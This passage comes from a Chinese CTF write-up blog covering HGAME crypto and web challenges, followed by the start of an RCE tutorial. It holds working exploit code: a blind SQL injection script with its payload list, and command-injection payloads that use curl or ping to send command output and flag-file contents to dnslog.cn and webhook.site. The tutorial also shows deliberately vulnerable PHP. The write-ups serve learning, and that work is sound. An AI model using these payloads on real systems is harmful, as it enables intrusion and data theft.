* i, <span class="hljs-number">3</span>)[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>        res = gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(i, res)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res)))<br>        <span class="hljs-keyword">break</span><br>   <br><span class="hljs-comment">#encrypt_exponent_should_be_bigger</span><br></code></pre></td></tr></table></figure><p>challenge 4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å…±æ¨¡æ”»å‡»</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">82359994555957061700863027886322811457676109608256083872064055426219259168794095530809575147825700925031273940545355557102788577532782300265260138429958167909187144110770618006792214374768047428973415244582649583493180328548963991180770977787901825467721537824736537797481709634514539903832239828285924506839</span><br>e1 = <span class="hljs-number">108289</span><br>e2 = <span class="hljs-number">81013</span><br>s = gcdext(e1, e2)<br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c1 = <span class="hljs-number">0x64d0825cadb4374aec113fcac2d752bb71d4586a9bb02b6d82f76fda0b642af037447b9cf76f80b1f4066bcf94dd6538b253a02aaa8f956edbd20c2a2f311b1f554ff7f968f124a8472d6d5306d9c96e16b737ee5675061e4de58bc6b5fb7f3cc5f92647c6aba9010b03b2c5d4d28b031d77205bc238b19785783e80e3a9146d</span><br>c2 = <span class="hljs-number">0x1eed249f0b99aa87992b59387ec11a0b36022aa475c3917d6a85c36745c5d0e7275c16e9879e2192491783533941b50cd97a0f4f32803df7118288c89f4e22555ca98d0417063dbb81c60e2d1a2e696bcec16660cd396aaf9b5743c1944b28adb33f73f70f3aa5fed5cd2cef0c9920dd54e68b34f40fe31e3662f1d9d484fff3</span><br><span class="hljs-comment"># e2=9647291</span><br>c2 = invert(c2, n)<br>m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#never_uese_same_modulus</span><br></code></pre></td></tr></table></figure><p><code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code></p><h3 id="åŒ…é‡Œæœ‰ä»€ä¹ˆ"><a class="markdownIt-Anchor" href="#åŒ…é‡Œæœ‰ä»€ä¹ˆ"></a> åŒ…é‡Œæœ‰ä»€ä¹ˆ</h3><p>çœ‹äº†å®˜æ–¹wpï¼Œå‘ç°æƒ³å¤šäº†ï¼Œä¸éœ€è¦æ±‚é•¿åº¦å’Œw</p><p>æ ¹æ®æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•ç›´æ¥å¯ä»¥æ±‚å‡ºwçš„é€†å…ƒ</p><img src="/2023/01/05/HGAME/17.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcdext<br>m = <span class="hljs-number">1528637222531038332958694965114330415773896571891017629493424</span><br>b0 = <span class="hljs-number">69356606533325456520968776034730214585110536932989313137926</span><br>c = <span class="hljs-number">93602062133487361151420753057739397161734651609786598765462162</span><br>winv = gcdext(b0, m)[<span class="hljs-number">1</span>]<br>v = c * winv % m &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-comment">#ä¹˜ä¸Šwçš„é€†å…ƒå†é™¤ä»¥2</span><br>flag = <span class="hljs-string">&#x27;hgame&#123;&#x27;</span> + long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(v)[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)).decode() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;1t&#x27;s_4n_3asy_ba9_isn7_it?&#125;</span><br></code></pre></td></tr></table></figure><h3 id="sign-in-pro-max"><a class="markdownIt-Anchor" href="#sign-in-pro-max"></a> Sign In Pro Max</h3><p>é™„ä»¶å¦‚ä¸‹</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1, <span class="hljs-keyword">is</span> seems like baseXX: QVl5Y3BNQjE1ektibnU3SnN6M0tGaQ==<br>Part2, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: c629d83ff9804fb62202e90b0945a323<br>Part3, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: <span class="hljs-number">99</span>f3b3ada2b4675c518ff23cbd9539da05e2f1f8<br>Part4, the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3 <span class="hljs-keyword">with</span> <span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds: <span class="hljs-number">1838</span>f8d5b547c012404e53a9d8c76c56399507a2b017058ec7f27428fda5e7db<br>Ufwy5 nx <span class="hljs-number">0</span>gh0jf61i21h, stb uzy fqq ymj ufwyx ytljymjw, its<span class="hljs-symbol">&#x27;y</span> ktwljy ymj ktwrfy.<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1æ˜¯baseåŠ å¯†ï¼šbase32+base58+base64f51d3a18<br>Part2,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size æ˜¯md5f91c<br>Part3,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size æ˜¯sha-<span class="hljs-number">1</span><span class="hljs-number">4952</span><br>Part4,the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3æ˜¯sha-<span class="hljs-number">2</span>ï¼Œ<span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> roundsæ˜¯sha-<span class="hljs-number">256</span>a3ed<br>æœ€åä¸€å¥æ˜¯å‡¯æ’’åŠ å¯†ï¼Œä½ç§»<span class="hljs-number">5</span>ï¼ŒPart5â€‚<span class="hljs-keyword">is</span>â€‚<span class="hljs-number">0</span>bc0ea61d21c,â€‚nowâ€‚putâ€‚<span class="hljs-keyword">all</span>â€‚theâ€‚partsâ€‚together,â€‚don<span class="hljs-symbol">&#x27;t</span>â€‚forgetâ€‚theâ€‚format<br></code></pre></td></tr></table></figure><p>ä»¥ä¸ºflagå°±æ˜¯hgame{f51d3a18f91c4952a3ed0bc0ea61d21c}</p><p>ç»“æœäº¤ä¸Šå»æ˜¯é”™çš„ï¼Œå‘ç°part5åé¢è¿˜æœ‰ä¸€å¥donâ€™t forget format,å°è¯•æ¯éƒ¨åˆ†ä¹‹é—´åŠ <code>_</code>,å‘ç°è¿˜æ˜¯é”™è¯¯ï¼Œæ¢æˆ<code>-</code>å°±å¯¹äº†</p><p><code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code></p><h2 id="week-3"><a class="markdownIt-Anchor" href="#week-3"></a> Week 3</h2><h3 id="login-to-get-my-gift"><a class="markdownIt-Anchor" href="#login-to-get-my-gift"></a> Login To Get My Gift</h3><p>æµ‹è¯•ä¸€ä¸‹ï¼Œåªæ˜¾ç¤º<code>Success</code>,<code>Fail</code>,<code>SQL Injection Detected</code>,åº”è¯¥æ˜¯ç›²æ³¨</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://week-3.hgame.lwsec.cn:31480/login&#x27;</span><br>cookie = &#123;<span class="hljs-string">&#x27;_ga_P1E9Z5LRRK&#x27;</span>: <span class="hljs-string">&#x27;GS1.1.1673534407.1.1.1673534578.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;_ga&#x27;</span>: <span class="hljs-string">&#x27;GA1.1.690589002.1673534407&#x27;</span>&#125;<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,PAssw0rD)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-number">1</span>&#125;<br>        rsp = requests.post(url=url, data=data, cookies=cookie)<br>        <span class="hljs-comment">#print(rsp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Success!&#x27;</span> <span class="hljs-keyword">in</span> rsp.text:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">0&#x27;/**/or/**/length((database()))&lt;8/**/#æ•°æ®åº“é•¿åº¦7<br>0&#x27;/**/or/**/ascii(right(left(database(),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;/**/#.format(i,j)æ•°æ®åº“åL0g1NMe<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&gt;1/**/#åªæœ‰ä¸€ä¸ªè¡¨<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&lt;15/**/#è¡¨åé•¿åº¦ä¸º14<br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)è¡¨åUser1nf0mAt1on<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/2,1)))&gt;1/**/#åˆ—æ•° 3åˆ—<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/0,1),1),1))/**/&gt;/**/100#<br>ç¬¬ä¸€åˆ—é•¿åº¦2 id ç¬¬äºŒåˆ—é•¿åº¦8 PAssw0rDç¬¬ä¸‰åˆ—é•¿åº¦8UsErN4me<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,UsErN4me)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)<br>1WeLc0meT0hgAmE2023hAPPySqlhgAmE2023HAppYnEwyEAr<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè®¿é—®/homeå¾—åˆ°flag</p><p><code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code></p><h3 id="ping-to-the-host"><a class="markdownIt-Anchor" href="#ping-to-the-host"></a> Ping To The Host</h3><p>ä¸€çœ‹RCE,é©¬ä¸Šè¯•ä¸€ä¸‹127.0.0.1|ls ï¼Œç»“æœæ— å›æ˜¾ã€‚ã€‚ã€‚ã€‚</p><p>è¯•äº†å‡ ä¸ªæ— å›æ˜¾RCEï¼Œå‘ç°DNSå¸¦å¤–å’Œhttpå¸¦å¤–å¯ä»¥ç”¨ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰ç‚¹å°å‘</p><p>payload1:DNSå¸¦å¤–</p><p>åœ¨<a href="http://www.dnslog.cn/">DNSLog</a>æ³¨å†Œä¸€ä¸ªä¸´æ—¶çš„DNS</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`whoami`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`head$IFS$<span class="hljs-number">9</span>/f*`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/18.png" class=""><p>payload2:httpå¸¦å¤–</p><p>åœ¨<a href="https://webhook.site/">webhook</a>ç”Ÿæˆä¸€ä¸ªä¸´æ—¶ç½‘ç«™æ¥æ¥å—è¯·æ±‚æŸ¥çœ‹å›æ˜¾</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`whoami`<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`head$IFS$<span class="hljs-number">9</span>/f*`<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/19.png" class=""><h3 id="gopher-shop"><a class="markdownIt-Anchor" href="#gopher-shop"></a> Gopher Shop</h3><p>è¿™é“æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„é¢˜ï¼Œçœ‹äº†wpï¼Œå­¦ä¹ ä¸€ä¸‹</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·è¿›å»å•†åº—</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//æ ¡éªŒæ˜¯å¦ä¹°çš„èµ·</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || number &lt; <span class="hljs-number">1</span> || user.Balance &lt; <span class="hljs-type">uint</span>(number) * price&#123;<br>context.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;invalid request&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯golangæ•´æ•°æº¢å‡ºæ¼æ´ï¼Œuintç±»å‹åœ¨64ä½æœºå™¨ä¸Šè¿â¾æ—¶ä¸ºuint64ï¼Œæœ€â¼¤å€¼ä¸º 18446744073709551615 ,æœ€â¼©å€¼ä¸º 0 ï¼Œè¶…å‡ºèŒƒå›´éƒ½ä¼šæº¢å‡ºã€‚</p><p>è¦ä½¿<code>uint(number) * price</code>å°äºç­‰äºç»™å®šçš„10å…ƒï¼Œè¿™æ ·å°±å¯ä»¥ä¹°åˆ°è¶…å¤šçš„Apple,å†æŠŠAppleä¹°å‡ºå»å°±å¯ä»¥ç”¨æ¥ä¹°flag</p><p><code>1844674407370955162*10=18446744073709551620=4&lt;10</code>,å› æ­¤å¯ä»¥è´­ä¹°1844674407370955162ä¸ªApple</p><img src="/2023/01/05/HGAME/20.png" class=""><p>æ…¢æ…¢åœ°æŠŠAppleå–å‡ºå»ï¼ˆæ•°å€¼ä¸èƒ½æº¢å‡ºï¼‰</p><img src="/2023/01/05/HGAME/21.png" class=""><p>å†Check Flagä¸€ä¸‹ï¼Œ<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code></p><h3 id="ezdh"><a class="markdownIt-Anchor" href="#ezdh"></a> ezDH</h3><p>è¿™ä¸ªå¯†ç é¢˜ä¸çŸ¥é“å¯ä»¥ç”¨sageâ¾¥çš„discrete_logå‡½æ•°æ¥è§£ç¦»æ•£å¯¹æ•°é—®é¢˜</p><p>discrete_log å°±æ˜¯ç»“åˆPohlig-Hellman algorithmå’Œâ¼¤æ­¥â¼©æ­¥æ³• (bsgs)</p><p>å¯ä»¥å¯¹æ•°åˆ†ç¦»å°±å˜å¾—ç®€å•äº†</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span><br>g = GF(N)(<span class="hljs-number">2</span>)<br>A = <span class="hljs-number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span><br>B = <span class="hljs-number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span><br>a=discrete_log(A,g)<br>b=discrete_log(B,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice secret:&#x27;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bod secret:&#x27;</span>,b)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(B,a,N)==<span class="hljs-built_in">pow</span>(A,b,N)<br>shared_secret=power_mod(B,a,N)<br>p=<span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a=-<span class="hljs-number">3</span><br>b=<span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>E = EllipticCurve(GF(p), [a, b])<br><br>G=(<span class="hljs-number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="hljs-number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)<br>G=E(G)<br>Pa=(<span class="hljs-number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="hljs-number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>) <br>Pa=E(Pa)<br>P1=(<span class="hljs-number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="hljs-number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)<br>P1=E(P1)<br>c=(<span class="hljs-number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="hljs-number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)<br>c=E(c)<br>m=c-shared_secret*P1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(m.xy()[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<span class="hljs-number">13292147408567104965230968399931206813163211945388416847625302108610603758415964822638521981</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;</span><br></code></pre></td></tr></table></figure><h3 id="tunnel"><a class="markdownIt-Anchor" href="#tunnel"></a> Tunnel</h3><p>ç”¨wiresharkæ‰“å¼€ï¼Œæœç´¢hagmeå°±æ‹¿åˆ°flag<code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE</title>
    <link href="/2023/01/05/RCE/"/>
    <url>/2023/01/05/RCE/</url>
    
    <content type="html"><![CDATA[<h3 id="rceåŸºç¡€"><a class="markdownIt-Anchor" href="#rceåŸºç¡€"></a> RCEåŸºç¡€</h3><p>RCE(remote command/code execute)æ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£<br />æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š<br />åœ¨CTFä¸­ï¼Œå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‘ç”Ÿåœ¨è¿œç¨‹ï¼Œæ•…è¢«ç§°ä¸ºè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨å¼€å‘è€…ä½¿ç”¨ä¸€äº›æ‰§è¡Œå‘½ä»¤å‡½æ•°ä¸”æœªå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œå®‰å…¨æ£€æŸ¥æ—¶ï¼Œå¯ä»¥æ³¨å…¥æ¶æ„çš„å‘½ä»¤ï¼Œä½¿æ•´å°æœåŠ¡å™¨å¤„äºå±é™©</p><p>ä¸­ã€‚å‘½ä»¤æ³¨å…¥å°±æ˜¯é€šè¿‡æ³¨å…¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæ”¹å˜åŸæœ¬çš„æ‰§è¡Œæ„å›¾ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚</p><p>PHP ä¸­æœ‰ä¸å°‘å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>();<br><span class="hljs-built_in">assert</span>();<br><span class="hljs-built_in">system</span>();<br><span class="hljs-built_in">exec</span>();<br><span class="hljs-built_in">shell_exec</span>();<br><span class="hljs-built_in">passthru</span>();<br><span class="hljs-built_in">escapeshellcmd</span>();<br><span class="hljs-built_in">pcntl_exec</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$str</span>);<br><span class="hljs-comment">#?content=123 &amp;&amp; whoami</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping&#x27;</span>.<span class="hljs-variable">$target</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-variable">$cmd</span>.<span 